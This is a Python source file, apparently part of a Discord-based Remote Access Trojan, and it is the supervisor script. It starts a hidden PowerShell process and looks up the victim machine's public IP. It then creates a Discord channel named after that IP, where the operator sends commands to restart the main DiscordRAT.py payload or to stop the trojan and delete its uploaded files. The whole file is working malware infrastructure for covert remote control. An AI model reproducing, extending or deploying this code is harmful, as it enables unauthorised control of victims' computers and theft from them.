from discord.ext import commands
from pathlib import Path
import discord
import urllib.request
import requests
import subprocess
import inspect
import shutil
import time
import os
import sys

DISCORD_TOKEN = "PLACE_DISCORD_BOT_TOKEN_HERE"

def get_local_appdata():
    return os.getenv("LOCALAPPDATA")

local_app_data = os.getenv('LOCALAPPDATA')
TARGET_DIR = os.path.join(local_app_data, "Discord-RAT-Bot")
UPLOAD_FOLDER = os.path.join(TARGET_DIR, "uploads") 
STATE_FILE = os.path.join(TARGET_DIR, "state.txt")

flask_process = None

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

flask_process = subprocess.Popen(
    ["python", os.path.join(TARGET_DIR, "FlaskServer.py")],
    cwd=TARGET_DIR)

def update_state(status):
    state_path = STATE_FILE
    with open(state_path, "w") as f:
        f.write(status)

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    
    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """
    
    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())
    return "\n".join(output)

@client.event
async def on_ready():
    global channel, flask_process
    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
    channel = await guild.create_text_channel("reconnect: " + ip)
    
    with open(STATE_FILE, "w") as f:
        f.write("supervisor")
    
    await channel.send(f"```This is the supervisor script for the Discord Bot, if you wish to connect back to {ip} then send the command \"restart\". If you wish to terminate this supervisor script then send the command \"stop\".```")

stop_confirm = False

@client.event
async def on_message(message):
    global stop_confirm, channel, ip, guild, channel, flask_process
    content = message.content.lower()

    if not channel or message.channel.id != channel.id:
        return
    if message.author.bot:
        return
    
    if stop_confirm:
        if content in ("y", "yes"):
            await message.channel.send("```Discord Remote Access Trojan is terminating...```")
            
            with open(STATE_FILE, "w") as f:
                f.write("hardstop")
            
            try:
                requests.post("http://127.0.0.1:5000/shutdown?state=hardstop")
                
                for f in os.listdir(UPLOAD_FOLDER):
                    os.remove(os.path.join(UPLOAD_FOLDER, f))
                return
            except:
                pass
                
            if flask_process:    
                flask_process.terminate()
            await client.close()
            return
        elif content in ("n", "no"):
            stop_confirm = False
            await message.channel.send("```Termination cancelled, supervisor script will remain running until \"STOP\" or \"RESTART\" is sent```")
            return

    if content == "stop":
        stop_confirm = True
        await message.channel.send("```Session is being terminated completly, are you sure you want to continue (Y/N):```")
        return
    if content == "restart":
        await message.channel.send("```Restarting...```")
        subprocess.Popen(["python", "DiscordRAT.py"])
        time.sleep(3)
        
        with open (STATE_FILE, "w") as f:
            f.write("running")
        
        server_dir = os.path.join(TARGET_DIR, "FlaskServer.py")
       # subprocess.Popen(["python", server_dir])
        
        time.sleep(3)
        await message.channel.send("```Discord Remote Access Trojan has successfully restarted.```")
        await client.close()
        return
    
    await message.channel.send("```Please enter a vaild command```")
    
client.run(DISCORD_TOKEN)
